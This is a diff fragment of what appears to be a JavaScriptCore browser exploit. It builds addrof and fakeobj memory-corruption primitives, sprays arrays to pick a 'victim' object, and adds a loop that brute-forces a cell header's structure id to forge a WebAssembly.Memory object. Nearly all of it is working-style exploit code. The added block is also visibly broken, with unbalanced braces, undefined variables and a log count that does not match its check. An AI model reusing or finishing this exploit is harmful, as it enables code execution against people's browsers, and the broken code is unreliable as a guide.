@@ -544,6 +544,7 @@ var VM_PROT_EXECUTE = 0x4
         array['prop' + i] = 13.37;
         structs.push(array);
     }
+              var victim = structs[0x800];
               /*var structs = [];
               var i = 0;
               var abc = [13.37];
@@ -554,7 +555,7 @@ var VM_PROT_EXECUTE = 0x4
 
     // take an array from somewhere in the middle so it is preceeded by non-null bytes which
     // will later be treated as the butterfly length.
-    //var victim = structs[0x800];
+    
     print(`[+] victim @ ${addrof(victim)}`);
 
     // craft a fake object to modify victim
@@ -569,6 +570,20 @@ var VM_PROT_EXECUTE = 0x4
     print(`[+] container @ ${containerAddr}`);
     // add the offset to let compiler recognize fake structure
     var hax = fakeobj(Add(containerAddr, new Int64(0x10)));
+    var maxtry = 0;
+    if (hax instanceof Array) {
+            log('got fakeobj with real struct id');
+            //continue;
+        } else {
+            while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
+            jsCellHeader.assignAdd(jsCellHeader, Int64.One);
+            container.header = header.asJSValue();
+            maxtry++;
+            if (maxtry == 100000)
+            {
+              log("wow 10000 tries on getting valid structid failed!!!");
+            }
+        }
     // origButterfly is now based on the offset of **victim** 
     // because it becomes the new butterfly pointer
     // and hax[1] === victim.pointer
